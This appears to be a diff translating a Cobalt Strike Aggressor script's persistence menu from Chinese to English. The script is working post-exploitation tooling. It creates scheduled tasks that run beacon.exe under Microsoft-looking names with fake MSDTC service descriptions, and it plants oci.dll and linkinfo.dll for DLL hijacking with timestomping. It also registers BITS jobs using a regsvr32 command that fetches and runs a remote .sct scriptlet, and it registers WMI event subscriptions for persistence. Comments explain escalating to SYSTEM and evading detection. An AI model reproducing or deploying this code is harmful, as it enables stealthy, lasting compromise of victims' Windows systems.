-					$Dialog = dialog("添加计划任务",%(taskname => $taskname,taskinfo => "协调跨多个数据库、消息队列、文件系统等资源管理器的事务。如果停止此任务，这些事务将会失败。如果禁用此任务，显式依赖此任务的其他服务将无法启动，系统可能会异常失败，请谨慎禁用。",taskrun => "C:\\beacon.exe",runuser => $user,level => $level,dotype => "ONSTART",ChannelName => "",EventID => "",bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "添加计划任务");
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "taskinfo", "任务描述: ");
-					drow_text($Dialog, "taskrun", "文件路径(/TR): ");
+					$Dialog = dialog("Add Program tasks",%(taskname => $taskname,taskinfo => "Coordinates transactions across multiple databases, message queues, file systems, and other resource managers. If this task is stopped, these transactions will fail. If this task is disabled, other services that explicitly depend on it will not start and the system may fail abnormally, so please disable it carefully.",taskrun => "C:\\beacon.exe",runuser => $user,level => $level,dotype => "ONSTART",ChannelName => "",EventID => "",bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "Add Program tasks");
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "taskinfo", "Task Description: ");
+					drow_text($Dialog, "taskrun", "File path(/TR): ");
 					if($is_admin){
-						drow_combobox($Dialog, "runuser", "用户帐户(/RU): ", @("Administrator","SYSTEM"));   # 如果用户是 Administrator,那可以通过选择 SYSTEM选项提权
-						#高权限可选择ONSTART ONLOGON等。
-						drow_combobox($Dialog, "dotype", "计划频率(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
+						drow_combobox($Dialog, "runuser", "User Account(/RU): ", @("Administrator","SYSTEM"));   # If the User is Administrator, then you can raise the privilege by selecting SYSTEM option
+						#High privileges can be selected by choosing ONSTART ONLOGON, etc.
+						drow_combobox($Dialog, "dotype", "Program Frequency(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
 					}else{ 
-						drow_text($Dialog, "runuser", "用户帐户(/RU): ");
-						drow_combobox($Dialog, "dotype", "计划频率(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
+						drow_text($Dialog, "runuser", "User Account(/RU): ");
+						drow_combobox($Dialog, "dotype", "Program Frequency(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
 					}
-					drow_combobox($Dialog, "level", "运行级别(/RL): ", @("LIMITED","HIGHEST"));
+					drow_combobox($Dialog, "level", "Run Level(/RL): ", @("LIMITED","HIGHEST"));
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}
@@ -550,43 +552,43 @@ menu "☆ 权限维持"{
 			item "Add-TaskAPI" {
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
-					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
+					#If it is a system account, the password is ignored and the User has to enter the password. The /RU option is to facilitate the creation of tasks from the administrator to SYSTEM and SYSTEM.
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
 					@AdminUsers = @("Administrator","SYSTEM");
 					
 					if($user in @("Administrator","SYSTEM","LOCAL SERVICE")){
 						$is_admin = 1;
-						$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_".ticks();  # LOCAL SERVICE 可以写入目录
-						warn($user);  # 提醒注意 ,显示在脚本控制台里,用于调试输出。
+						$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_".ticks();  # LOCAL SERVICE can Write to directory
+						warn($user);  # Note that this is displayed in the Script Control Desk for debugging output.
 					}else{
-						#非管理员创建计划任务。
-						#普通用户权限无法写入Microsoft任务下。
-						#普通用户无法使用/NP(不储存任何密码。任务以给定用户的身份非交互的方式运行。只有本地资源可用。), /RL HIGHEST
+						#Non-administrator created Program tasks。
+						#Normal User permissions are not available under the Write to Microsoft task.
+						#Normal User cannot use /NP (no password is stored. Only local resources are available.), /RL HIGHEST
 						$is_admin = 0;
 						$taskname = "\\Explorer\\Public\\temp_".ticks();
 						warn($user);
 					}
-					$Dialog = dialog("添加计划任务",%(taskname => $taskname,taskinfo => "协调跨多个数据库、消息队列、文件系统等资源管理器的事务。如果停止此任务，这些事务将会失败。如果禁用此任务，显式依赖此任务的其他服务将无法启动，系统可能会异常失败，请谨慎禁用。",taskrun => "C:\\beacon.exe",runuser => $user,dotype => "BOOT",CreateIs => "Microsoft Corporation",Runtime => "",bid => $bid),&AddSchtasks_API);
-					dialog_description($Dialog, "反射DLL中使用API添加计划任务");
-					drow_text($Dialog, "taskname", "任务名称: ");
-					drow_text($Dialog, "taskinfo", "任务描述: ");
-					drow_text($Dialog, "CreateIs", "创建者: ");
-					drow_text($Dialog, "taskrun", "执行命令: ");
+					$Dialog = dialog("Add Program tasks",%(taskname => $taskname,taskinfo => "Coordinates transactions across multiple databases, message queues, file systems, and other resource managers. If this task is stopped, these transactions will fail. If this task is disabled, other services that explicitly depend on it will not start and the system may fail abnormally, so please disable it carefully.",taskrun => "C:\\beacon.exe",runuser => $user,dotype => "BOOT",CreateIs => "Microsoft Corporation",Runtime => "",bid => $bid),&AddSchtasks_API);
+					dialog_description($Dialog, "Using APIAdd Program tasks in the reflection DLL");
+					drow_text($Dialog, "taskname", "Task name: ");
+					drow_text($Dialog, "taskinfo", "Task Description: ");
+					drow_text($Dialog, "CreateIs", "Created by: ");
+					drow_text($Dialog, "taskrun", "ExecutionCommand: ");
 					if($is_admin){
 						if($user eq "SYSTEM"){
-							drow_combobox($Dialog, "runuser", "启动身份: ", @($user,"\\Everyone","Local Service")); 
+							drow_combobox($Dialog, "runuser", "Initiating User: ", @($user,"\\Everyone","Local Service")); 
 						}else if($user eq "LOCAL SERVICE")
 						{
-							drow_text($Dialog, "runuser", "启动身份: "); 
+							drow_text($Dialog, "runuser", "Initiating User: "); 
 						}
 						else{
-							drow_combobox($Dialog, "runuser", "启动身份: ", @($user,"NT AUTHORITY\\SYSTEM","Local Service"));   # 如果用户是 Administrator,那可以通过选择 SYSTEM选项提权
+							drow_combobox($Dialog, "runuser", "Initiating User: ", @($user,"NT AUTHORITY\\SYSTEM","Local Service"));   # If the User is Administrator, then you can remove the power by selecting the SYSTEM option
 						}
 						
-						drow_combobox($Dialog, "dotype", "触发方式: ", @("ONBOOT","ONLOGON","ONIDLE","ONEVENT","ONCE","DAILY","WEEKLY","MONTHLY","SESSION_STATE_CHANGE"));
+						drow_combobox($Dialog, "dotype", "Trigger Mode: ", @("ONBOOT","ONLOGON","ONIDLE","ONEVENT","ONCE","DAILY","WEEKLY","MONTHLY","SESSION_STATE_CHANGE"));
 					}else{ 
-						drow_text($Dialog, "runuser", "启动身份: ");
-						drow_combobox($Dialog, "dotype", "触发方式: ", @("ONIDLE","ONCE","DAILY","WEEKLY","MONTHLY"));
+						drow_text($Dialog, "runuser", "Initiating User: ");
+						drow_combobox($Dialog, "dotype", "Trigger Mode: ", @("ONIDLE","ONCE","DAILY","WEEKLY","MONTHLY"));
 					}
 					
 					dbutton_action($Dialog, "AddSchtasks");
@@ -595,7 +597,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "删除计划任务" {
+			item "Delete Program tasks" {
 				local('$bid $user $taskname');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -607,10 +609,10 @@ menu "☆ 权限维持"{
 							$taskname = "\\Explorer\\Public\\temp_";
 							warn($user);
 					}
-					$Dialog = dialog("删除计划任务",%(taskname => $taskname , type => "schtasks" , bid => $bid) , &DelSchtasks);
-					dialog_description($Dialog, "删除计划任务");
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_combobox($Dialog, "type", "执行方式: ", @("schtasks","API"));
+					$Dialog = dialog("Delete Program tasks",%(taskname => $taskname , type => "schtasks" , bid => $bid) , &DelSchtasks);
+					dialog_description($Dialog, "Delete Program tasks");
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_combobox($Dialog, "type", "ExecutionMode: ", @("schtasks","API"));
 					dbutton_action($Dialog, "DelSchtasks");
 					dialog_show($Dialog);
 				}
@@ -631,14 +633,14 @@ menu "☆ 权限维持"{
 			$level = $3['level'];
 			$runuser = $3['runuser'];
 			$MO = $3['MO'];
-			#如果是事件触发
+			#If it is an event Trigger 
 			if($dotype eq "ONEVENT"){
-				#设置事件类型和事件ID
+				#Settings Event Types and Events ID
 				if($ChannelName eq "" ){
-					$Dialog = dialog("设置事件",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,taskrun => $taskrun ,dotype => $dotype ,ChannelName => "Security" ,EventID => "4624" ,type => "schtasks",level => $level,runuser => $runuser,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "常用事件：Security-4624:帐户已成功登录;Security-4634:帐户已注销;System-7001:客户体验改善计划的用户登录通知;Application-9027:桌面窗口管理器已注册会话端口;");
-					drow_combobox($Dialog, "ChannelName", "事件通道(/EC): ", @("Security","System","Application","Setup"));    
-					drow_text($Dialog, "EventID", "事件ID: ");
+					$Dialog = dialog("Settings Events",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,taskrun => $taskrun ,dotype => $dotype ,ChannelName => "Security" ,EventID => "4624" ,type => "schtasks",level => $level,runuser => $runuser,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "Commonly used Events：Security-4624:AccountLogged in successfully;Security-4634:Account Logged out;System-7001:User login notification for Customer Experience Improvement Program;Application-9027:Desktop Window Manager has registered session port;");
+					drow_combobox($Dialog, "ChannelName", "Events Passage(/EC): ", @("Security","System","Application","Setup"));    
+					drow_text($Dialog, "EventID", "EventsID: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -653,7 +655,7 @@ menu "☆ 权限维持"{
 					}
 					
 				}
-			}else if($dotype eq "ONSTART"){  #启动执行,不能以SYSTEM添加,任务可以创建，但是启动不了,需要指定/RU 为SYSTEM
+			}else if($dotype eq "ONSTART"){  #Start Execution, you can't start it with SYSTEMAdd, the task can be created, but it can't be started, you need to specify /RU for SYSTEM
 				if (!-isadmin $bid){
 					berror($bid,"Persistence Requires Admin Level Privileges");
 				}else{
@@ -665,7 +667,7 @@ menu "☆ 权限维持"{
 						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /F /DELAY 0000:05");
 					}
 				}
-			}else if($dotype eq "ONLOGON"){  	#登录时执行
+			}else if($dotype eq "ONLOGON"){  	#When logging in Execution
 				if (!-isadmin $bid){
 					berror($bid,"Persistence Requires Admin Level Privileges");
 				}else{
@@ -678,19 +680,19 @@ menu "☆ 权限维持"{
 					}
 				}
 			}
-			#空闲执行,一段时间没有鼠标键盘输入后一分钟执行任务,需要给马加互斥锁,执行后容易被kill..
+			#Idle Execution, a period of time without mouse and keyboard input after a minute Execution task, you need to add a mutex lock to the horse, after Execution is easy to be kill..
 			else if($dotype eq "ONIDLE"){
 				if($runuser eq "SYSTEM"){blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /I 1");
 				bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /I 1");}else{blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /I 1");
 				bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /I 1");}
 			}
-			#执行一次
+			#Executed once
 			else if($dotype eq "ONCE"){
 				if($ST eq ""){
-					$Dialog = dialog("Once设置开始时间",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,runuser => $runuser,taskrun => $taskrun ,dotype => $dotype ,ST => formatDate(ticks() + (1000 * 30), "HH:mm") ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于一次性计划任务,请设置开始时间,时间格式为 HH:mm (24 小时时间),默认30秒后启动。"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "ST", "开始时间: ");
+					$Dialog = dialog("OnceSettings Start time",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,runuser => $runuser,taskrun => $taskrun ,dotype => $dotype ,ST => formatDate(ticks() + (1000 * 30), "HH:mm") ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For one-time Program tasks, please Settings Start time,The time format is HH:mm (24 hour time), default 30 seconds after start."); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "ST", "Start time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -714,10 +716,10 @@ menu "☆ 权限维持"{
 				}
 			}else if($dotype eq "MINUTE"){
 				if($MO eq ""){
-					$Dialog = dialog("分钟频率执行",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "10" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于每隔多少分钟执行任务,请设置间隔时间,/MO：1 到 1439 分钟"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "MO", "间隔时间: ");
+					$Dialog = dialog("Minute Rate Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "10" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For how many minutes to Execution tasks, please Settings Interval, /MO: 1 to 1439 minutes"); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "MO", "Interval time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -733,10 +735,10 @@ menu "☆ 权限维持"{
 			else if($dotype eq "HOURLY")
 			{
 				if($MO eq ""){
-					$Dialog = dialog("小时频率执行",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于每隔多少小时执行任务,请设置间隔时间,/MO：1 - 23 小时"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "MO", "间隔时间: ");
+					$Dialog = dialog("Hourly frequency Execution",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For how many hours to Execution tasks, please Settings Interval time,/MO：1 - 23 Hours"); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "MO", "Interval time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -751,10 +753,10 @@ menu "☆ 权限维持"{
 			}
 			else if($dotype eq "DAILY"){
 				if($MO eq ""){
-					$Dialog = dialog("按天频率执行",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于每隔多少天执行任务,请设置间隔时间,/MO：1 到 365 天"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "MO", "间隔时间: ");
+					$Dialog = dialog("Frequency by day Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For how many days to Execution tasks, please Settings Interval time,/MO: 1 to 365 days"); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "MO", "Interval time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -768,10 +770,10 @@ menu "☆ 权限维持"{
 				}		
 			}else if($dotype eq "WEEKLY"){
 				if($MO eq ""){
-					$Dialog = dialog("按周频率执行",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于每隔多少周执行任务,请设置间隔时间,/MO：1 到 52 周"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "MO", "间隔时间: ");
+					$Dialog = dialog("Weekly Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For how many weeks to Execution tasks, please Settings Interval time,/MO: 1 to 52 weeks"); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "MO", "Interval time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -787,11 +789,10 @@ menu "☆ 权限维持"{
 			else if($dotype eq "MONTHLY")
 			{
 				if($MO eq ""){
-					$Dialog = dialog("按月频率执行",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
-					dialog_description($Dialog, "用于每隔多少月执行任务,请设置间隔时间,/MO：1 到 12，或
-				FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY"); 
-					drow_text($Dialog, "taskname", "任务名称(/TN): ");
-					drow_text($Dialog, "MO", "间隔时间: ");
+					$Dialog = dialog("Monthly Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
+					dialog_description($Dialog, "For how many months to Execution tasks, please Settings Interval time,/MO: 1 to 12, or FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY"); 
+					drow_text($Dialog, "taskname", "Task name(/TN): ");
+					drow_text($Dialog, "MO", "Interval time: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}else{
@@ -819,19 +820,19 @@ menu "☆ 权限维持"{
 			$dotype = $3['dotype'];
 			$CreateIs = $3['CreateIs'];
 			$Runtime = $3['Runtime'];
-			#以下方式不用设置时间，ONIDLE默认空闲5分钟，SESSION_STATE_CHANGE 默认管理员断开远程链接启用(服务器)
+			#The following Mode does not use Settings time, ONIDLE default idle 5 minutes, SESSION_STATE_CHANGE default administrator disconnect remote link enabled (server)
 			if($dotype in @("ONBOOT","ONLOGON","ONIDLE","SESSION_STATE_CHANGE")){
 				blog($bid , "Add $dotype Schtasks,Taskname is:$taskname");
 				$Runtime = "2020-05-20T05:20:00";
 				$Parameter = $taskname . "|" . URLencode(replace($taskinfo,' ',''))  . "|" .$taskrun. "|" .$runuser. "|" .$CreateIs."|".$Runtime."|".$dotype;	
 				$Data = pack("I-", 2) .$Parameter;
 				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
-			}else{   #每天在设置的时间执行，每周5执行，每月13号执行
+			}else{   #Execution daily at the time of Settings, 5 Execution per week, 13 Execution per month
 				if($Runtime eq ""){
-					$Dialog = dialog("设置计划任务开始时间",%(taskname => $taskname,taskinfo => $taskinfo,taskrun => $taskrun,runuser => $runuser,dotype => $dotype,CreateIs => $CreateIs,Runtime => (formatDate((ticks()+(1000 * 30)),"yyyy-MM-dd'T'HH:mm:ss")),bid => $bid),&AddSchtasks_API);
-					dialog_description($Dialog, "反射DLL中使用API添加计划任务");
-					drow_text($Dialog, "taskname", "任务名称: ");
-					drow_text($Dialog, "Runtime", "执行时间: ");
+					$Dialog = dialog("Settings Program tasksStart time",%(taskname => $taskname,taskinfo => $taskinfo,taskrun => $taskrun,runuser => $runuser,dotype => $dotype,CreateIs => $CreateIs,Runtime => (formatDate((ticks()+(1000 * 30)),"yyyy-MM-dd'T'HH:mm:ss")),bid => $bid),&AddSchtasks_API);
+					dialog_description($Dialog, "Using API Add Program tasks in the reflection DLL");
+					drow_text($Dialog, "taskname", "Task name: ");
+					drow_text($Dialog, "Runtime", "ExecutionTime: ");
 					dbutton_action($Dialog, "AddSchtasks");
 					dialog_show($Dialog);
 				}
@@ -855,13 +856,13 @@ menu "☆ 权限维持"{
 			}
 		}
 
-		menu "DLL加载"{
+		menu "DLL Loading"{
 			menu "Msdtc" {
-				item "上传oci.dll" {
+				item "Upload oci.dll" {
 					local('$bid');
 					foreach $bid ($1){
-					#选择cs自动生成的，选择本地存在的，
-						$Dialog = dialog("上传oci.dll", %(ociFile => "" , bid => $bid), lambda({
+					#Select the cs auto-generated, select the locally existing
+						$Dialog = dialog("Upload oci.dll", %(ociFile => "" , bid => $bid), lambda({
 							local('$bid $ociFile $Arch $Parameter $Data $TempFile $NewFile');
 							$ociFile = $3['ociFile'];
 							$Arch = $3['Arch'];
@@ -887,15 +888,15 @@ menu "☆ 权限维持"{
 							blog($bid,"sc start msdtc");	
 							brun($bid,"sc start msdtc");	
 							}));
-						dialog_description($Dialog, "上传oci.dll到C:\\Windows\\System32\\");
+						dialog_description($Dialog, "Upload oci.dll到C:\\Windows\\System32\\");
 						drow_file($Dialog, "ociFile", "File: ");
-						dbutton_action($Dialog, "执行");
+						dbutton_action($Dialog, "Execution");
 						dialog_show($Dialog);
 					}
 				}
 
 				# MoveFileEx.dll  D:\xxx\CobaltStrike_script\Persistence\MSDTC
-				item "清理oci.dll"{
+				item "Remove oci.dll"{
 					local('$bid $ociFile $Data');
 					$ociFile = "C:\\windows\\system32\\oci.dll";
 					foreach $bid ($1){
@@ -918,12 +919,12 @@ menu "☆ 权限维持"{
 			
 			# https://www.cnblogs.com/websecyw/p/12561630.html
 			menu "Linkinfo" {
-				item "上传linkinfo.dll"{
+				item "Upload linkinfo.dll"{
 					local('$bid');
 					foreach $bid ($1){
 						#binput($bid, "blockdlls start"); 
 						#bblockdlls($bid, true); 
-						$Dialog = dialog("上传linkinfo.dll", %(linkinfoFile => "", bid => $bid), 
+						$Dialog = dialog("Upload linkinfo.dll", %(linkinfoFile => "", bid => $bid), 
 							lambda({
 								local('$bid $linkinfoFile $TempFile');
 								$TempFile = "C:\\windows\\linkinfo.dll";
@@ -937,14 +938,14 @@ menu "☆ 权限维持"{
 								btimestomp($bid,$TempFile,"C:\\windows\\regedit.exe");
 							})
 						);
-						dialog_description($Dialog, "上传linkinfo.dll到C:\\Windows\\");
+						dialog_description($Dialog, "Upload linkinfo.dll to C:\\Windows\\");
 						drow_file($Dialog, "linkinfoFile", "File: ");
-						dbutton_action($Dialog, "执行");
+						dbutton_action($Dialog, "Execution");
 						dialog_show($Dialog);
 					}
 				}
 				
-				item "清理linkinfo.dll"{
+				item "Remove linkinfo.dll"{
 					local('$bid $TempFile');
 					$TempFile = "C:\\windows\\linkinfo.dll";
 					foreach $bid ($1){
@@ -966,12 +967,12 @@ menu "☆ 权限维持"{
 			$Arch = $3['Arch'];
 			$Type = $3['Type'];
 			$linkinfofile = $3['linkinfofile'];
-			if($Type eq "上传本地文件"){
+			if($Type eq "Upload local file"){
 				if($linkinfofile eq ""){
-					$Dialog = dialog("上传linkinfo.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "上传本地文件",linkinfofile => $linkinfofile), &linkinfoUpoad);
-					dialog_description($Dialog, "请选择linkinfo.dll上传");
+					$Dialog = dialog("Upload linkinfo.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "Upload local file",linkinfofile => $linkinfofile), &linkinfoUpoad);
+					dialog_description($Dialog, "Please select linkinfo.dllUpload ");
 					drow_file($Dialog, "linkinfofile", "File: ");
-					dbutton_action($Dialog, "上传");
+					dbutton_action($Dialog, "Upload ");
 					dialog_show($Dialog);
 				}else{
 					blog($bid, "-------".getnow()."-------");
@@ -981,30 +982,30 @@ menu "☆ 权限维持"{
 					blog($bid, "Done.");
 				}
 			}else{
-				blog($bid,"生成dll文件");
+				blog($bid,"Generate dll file");
 				
 			}
 		}
 		}
 
-		menu "BITS任务"{
-			item "添加任务"{
+		menu "BITSadmin Task"{
+			item "Add Task"{
 				local('$bid');
 				foreach $bid ($1){
-					$dialog = dialog("Bitsadmin 持久化", %(JobName => "WindowsUpdate", CmdLine => "regsvr32.exe /u /s /i:http://192.168.11.1:80/download/calc.sct scrobj.dll" ,bid => $bid), &bitsadmin);
-					dialog_description($dialog, "创建要作为当前用户上下文执行的bitsadmin任务。此任务将在用户每次登录时执行。目前只适用于Windows7、8、Server 2008和Server 2012。");
-					drow_text($dialog, "JobName",  "任务名称：");
-					drow_text($dialog, "CmdLine", "执行命令:");
+					$dialog = dialog("Bitsadmin Persistence", %(JobName => "WindowsUpdate", CmdLine => "regsvr32.exe /u /s /i:http://192.168.11.1:80/download/calc.sct scrobj.dll" ,bid => $bid), &bitsadmin);
+					dialog_description($dialog, "Create a bitsadmin Task to be executed as the current User context. this Task will be executed every time the User logs in. currently only available for Windows 7, 8, Server 2008 and Server 2012.");
+					drow_text($dialog, "JobName",  "Task name：");
+					drow_text($dialog, "CmdLine", "ExecutionCommand:");
 					dbutton_action($dialog, "Create");
 					dialog_show($dialog);
 				}
 			}
 			
-			item "查询任务"{
-				#获取任务创建时间 bitsadmin /GetCreationTime <Job>
+			item "Query Task"{
+				#Get Task creation time bitsadmin /GetCreationTime <Job>
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("查询任务", %(JobName => "WindowsUpdate", bid => $bid), lambda({
+					$Dialog = dialog("Query Task", %(JobName => "WindowsUpdate", bid => $bid), lambda({
 						local('$bid $JobName');
 						$bid = $3['bid'];
 						$JobName = $3['JobName'];
@@ -1022,17 +1023,17 @@ menu "☆ 权限维持"{
 						}})
 					);
 					
-					dialog_description($Dialog, "根据任务名称查询创建时间,留空则列出全部任务。");
-					drow_text($Dialog, "JobName",  "任务名称:");
+					dialog_description($Dialog, "Query the creation time according to Task name, and list all Task if left blank.");
+					drow_text($Dialog, "JobName",  "Task name:");
 					dbutton_action($Dialog, "Query");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "删除任务"{
+			item "Delete Task"{
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("删除任务", %(JobName => "WindowsUpdate", bid => $bid), lambda({
+					$Dialog = dialog("Delete Task", %(JobName => "WindowsUpdate", bid => $bid), lambda({
 						local('$bid $JobName');
 						$bid = $3['bid'];
 						$JobName = $3['JobName'];
@@ -1050,8 +1051,8 @@ menu "☆ 权限维持"{
 						}
 					}));
 						
-					dialog_description($Dialog, "根据任务名称删除BitJob,留空则删除全部。");
-					drow_text($Dialog, "JobName",  "任务名称:");
+					dialog_description($Dialog, "According to Task nameDelete BitJob, leave empty then Delete all.");
+					drow_text($Dialog, "JobName",  "Task name:");
 					dbutton_action($Dialog, "Cancel");
 					dialog_show($Dialog);
 				}
@@ -1059,25 +1060,25 @@ menu "☆ 权限维持"{
 		}
 
 		#WMI Event Subscription
-		menu "WMI事件" {
-			item "注册事件订阅" {
+		menu "WMIEvents" {
+			item "Register Events Subscribe" {
 				local('$bid');
 				foreach $bid ($1){	
-					$Dialog = dialog("WMI注册", %(EventFilterName => "WindowsUpdate_".ticks(), EventConsumerName => "DownLoader_" .ticks(), RunType => "CommandLine" , Trigger => "Timed", bid => $bid) ,  &RegWMI );
-					dialog_description($Dialog, "注册WMI永久性事件订阅用于权限维持。");
-					drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-					drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-					drow_combobox($Dialog, "Trigger", "事件触发器类型: ", @("InsertUSB","UserLogon","ProcessStart","Interval","Timed","Reboot"));
-					drow_combobox($Dialog, "RunType", "事件消费者类名: ", @("CommandLine","ActiveScript")); #,"LocalScriptBlock"
-					dbutton_action($Dialog, "注册");
+					$Dialog = dialog("WMI Registration", %(EventFilterName => "WindowsUpdate_".ticks(), EventConsumerName => "DownLoader_" .ticks(), RunType => "CommandLine" , Trigger => "Timed", bid => $bid) ,  &RegWMI );
+					dialog_description($Dialog, "Register WMI permanent Events subscription for permission maintenance.");
+					drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+					drow_combobox($Dialog, "Trigger", "EventsTrigger Instrument Type: ", @("InsertUSB","UserLogon","ProcessStart","Interval","Timed","Reboot"));
+					drow_combobox($Dialog, "RunType", "EventsConsumer Category Name: ", @("CommandLine","ActiveScript")); #,"LocalScriptBlock"
+					dbutton_action($Dialog, "Registration");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "检查事件订阅" {
+			item "Check Events subscriptions" {
 				local('$bid');
 				foreach $bid ($1){
